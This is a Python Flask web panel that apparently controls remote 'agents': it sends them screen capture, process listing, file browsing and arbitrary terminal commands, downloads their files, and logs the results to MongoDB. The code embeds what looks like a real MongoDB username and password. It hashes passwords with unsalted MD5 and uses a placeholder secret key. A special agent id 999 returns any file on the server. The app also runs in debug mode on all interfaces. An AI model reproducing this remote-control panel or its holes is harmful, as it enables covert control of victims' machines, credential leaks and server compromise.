from flask import Flask, render_template, send_file, request, redirect, url_for, session, make_response
from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required, current_user
from pymongo import MongoClient
from datetime import datetime
import threading
import hashlib
import socket
import struct
import json
import os

# Thread lock for managing concurrent access to users
users_lock = threading.Lock()

# Dictionary to keep track of online users
online_users = {}

# MongoDB client setup
client = MongoClient("mongodb+srv://thepuppy:RVCBoUDWLWb0QeH0@mycluster.8enuio5.mongodb.net/")
dbUsers = client['Users']
dbData = client['Data']

# Flask app setup
app = Flask(__name__)
app.secret_key = 'your_secret_key'

# Flask-Login setup
login_manager = LoginManager()
login_manager.init_app(app)

# List of available options/features
options = [ "ScreenCapture", "ProcessesInfo", "FileExplorer", "Terminal"]

class MongoDB:
    """Class for MongoDB operations."""
    def __init__(self, client, dbUsers, dbData):
        self.client = client
        self.dbUsers = dbUsers
        self.dbData = dbData
    
    def doesUserExistInDB(self, username, password):
        """Check if a user exists in the database."""
        user = self.dbUsers['Managers'].find_one({'username': username, 'password': password})
        return user is not None
    
    def insertUserInDB(self, username, password):
        """Insert a new user into the database."""
        existing_user = self.dbUsers['Managers'].find_one({'username': username})
        if existing_user:
            return False
        new_user = {'username': username, 'password': password}
        self.dbUsers['Managers'].insert_one(new_user)
        return True
    def insertAgentInDB(self, agent_id,  name, addr, manager_username):
        """Insert a new agent into the database."""
        self.dbUsers['Agents'].insert_one({
            'agent_id': agent_id,
            'name': name,
            'addr': addr,
            'manager_username': manager_username
            })
    def insertDataInDB(self, feature_name, agent_id, data):
        """Insert feature data into the database."""
        self.dbData[feature_name].insert_one({
            'agent_id': agent_id,
            'data': data,
            'timestamp': datetime.now()
        })

db_handler = MongoDB(client, dbUsers, dbData)

class Agent:
    """Class representing an agent."""
    def __init__(self, token, agent_socket, name):
        self.token = token
        self.agent_socket = agent_socket
        self.name = name
        
    def getToken(self):
        return self.token
    
    def getAgentSocket(self):
        return self.agent_socket
    
    def send_feature(self, feature_name):
        """Send a feature request to the agent."""
        try:
            feature_data = feature_name.encode()
            data_length = struct.pack('>I', len(feature_data))
            self.agent_socket.send(data_length)
            self.agent_socket.send(feature_data)
        except Exception as e:
            print(f"Error sending feature '{feature_name}' to Agent {self.token}: {e}")
    
    def recv_feature_data(self):
        """Receive feature data from the agent."""
        try:
            message_length_bytes = self.agent_socket.recv(4)
            if not message_length_bytes:
                return None

            message_length = struct.unpack('>I', message_length_bytes)[0]
            message = self.agent_socket.recv(message_length).decode('utf-8')
            if message:
                return message
            return None
        except Exception as e:
            print(f"Error receiving message: {e}")
            return None

class Manager(UserMixin):
    """Class representing a manager."""
    def __init__(self, username, password):
        self.username = username
        self.password = password
        self.agents = []
    
    def get_agent_by_token(self, token):
        """Get an agent by token."""
        for agent in self.agents:
            if agent.getToken() == token:
                return agent
    
    def get_id(self):
        return self.username

@login_manager.user_loader
def load_user(user_id):
    return Manager(user_id, "")

def handle_client(conn, addr, username, name):
    """Handle new agent connections."""
    agent = Agent(token=len(online_users[username].agents) + 1, agent_socket=conn, name=name+ '#'+str(len(online_users[username].agents) + 1) )
    db_handler.insertAgentInDB(agent_id=len(online_users[username].agents) + 1, name=name, addr=addr, manager_username=username)
    online_users[username].agents.append(agent)
    
def find_available_port():
    """Find an available port."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('localhost', 0))
    port = s.getsockname()[1]
    s.close()
    return port

def start_server():
    """Start the server to listen for new agent connections."""
    HOST = '127.0.0.1'
    PORT = find_available_port()
    print(f"Using port: {PORT}")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((HOST, PORT))
        server_socket.listen()
        while True:
            conn, addr = server_socket.accept()
            raw_output = conn.recv(1024).decode('utf-8').strip()
            output = json.loads(raw_output)
            if output['MangerUsername'] in online_users:
                threading.Thread(target=handle_client, args=(conn, addr, output['MangerUsername'], output['AgentName'])).start()
            else:
                print(f"Manager {output['MangerUsername']} does not exist.")
                conn.close()

@app.route('/home')
@app.route('/')
def home():
    return render_template('home.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    logout_user()
    if current_user.is_authenticated:
        return redirect(url_for('dashboard'))
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password = str(hashlib.md5(str(password).encode()).hexdigest())
        if db_handler.doesUserExistInDB(username, password):
            user = online_users.get(username) or Manager(username, password)
            login_user(user)
            online_users[username] = user
            return redirect(url_for('dashboard'))
        else:
            print("Invalid username or password")
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if current_user.is_authenticated:
        return redirect(url_for('dashboard'))
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password = str(hashlib.md5(str(password).encode()).hexdigest())
        if not db_handler.doesUserExistInDB(username, password):
            if db_handler.insertUserInDB(username, password):
                user = Manager(username, password)
                login_user(user)
                online_users[username] = user
                return redirect(url_for('dashboard'))
            else:
                print("Username already exists")
                return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('dashboard.html', username=current_user.username, agents=online_users[current_user.username].agents)

@app.route('/agent/<int:agent_id>', methods=['GET', 'POST'])
@login_required
def agent(agent_id):
    output = ""
    selected = ""
    if request.method == 'POST':
        if current_user.is_authenticated:
            feature_name = request.form.get('feature')
            path = request.form.get('path', 'C://') if feature_name == 'FileExplorer' else None
            command = request.form.get('command') if feature_name == 'Terminal' else None
            agent = online_users[current_user.username].get_agent_by_token(agent_id)
            if agent is not None:
                if feature_name == 'FileExplorer' and path:
                    agent.send_feature(f"{feature_name} {path}")
                elif feature_name == 'Terminal' and command:
                    agent.send_feature(f"{feature_name} {command}")
                else:
                    agent.send_feature(feature_name)
                raw_output = agent.recv_feature_data()
                try:
                    output = json.loads(raw_output)
                except json.decoder.JSONDecodeError:
                    # Handle the case where output cannot be parsed as JSON
                    output = raw_output
                selected=feature_name
                db_handler.insertDataInDB(feature_name, agent_id, output)
            else:
                selected = ""
    return render_template('agent.html', agent_token=agent_id, options=options, output=output, selected=selected)

@app.route('/navigate/<int:agent_id>', methods=['GET'])
@login_required
def navigate(agent_id):
    path = request.args.get('path')
    agent = online_users[current_user.username].get_agent_by_token(agent_id)
    if agent:
        agent.send_feature(f"FileExplorer {path}")
        raw_output = agent.recv_feature_data()
        if raw_output:
            try:
                output = json.loads(raw_output)
            except json.decoder.JSONDecodeError:
                output = {"Error": "Failed to parse the received data as JSON."}
        else:
            output = {"Error": "No data received from the agent."}
        return render_template('agent.html', agent_token=agent_id, options=options, output=output, selected='FileExplorer')
    else:
        return redirect(url_for('dashboard'))
    
@app.route('/download/<int:agent_id>', methods=['GET'])
@login_required
def download(agent_id):
    file_path = request.args.get('path')
    agent = online_users[current_user.username].get_agent_by_token(agent_id)
    if agent_id == 999:
        try:
            # Check if file exists
            if os.path.exists(file_path):
                return send_file(file_path, as_attachment=True)
            else:
                return "File not found.", 404
        except Exception as e:
            print(f"Error serving file: {e}")
            return "Error serving file.", 500
    elif agent:
        agent.send_feature(f"FileExplorer {file_path}")
        raw_output = agent.recv_feature_data()
        if raw_output:
            # Handle file download (this example assumes raw_output contains the file data)
            output = json.loads(raw_output)
            response = make_response(output['FileContent'])
            
            return response
        else:
            return "No data received from the agent.", 300
    else:
        #return "Agent with token {agent_id} not found.", 100
        return redirect(url_for('dashboard'))

@app.route('/logout')
@login_required
def logout():
    logout_user()
    # for username in online_users:
    #     for agent in online_users[username].agents:
    #         agent.close()
    return redirect(url_for('home'))

if __name__ == "__main__":
    threading.Thread(target=start_server).start()
    app.run(host='0.0.0.0', debug=True, port=2134)
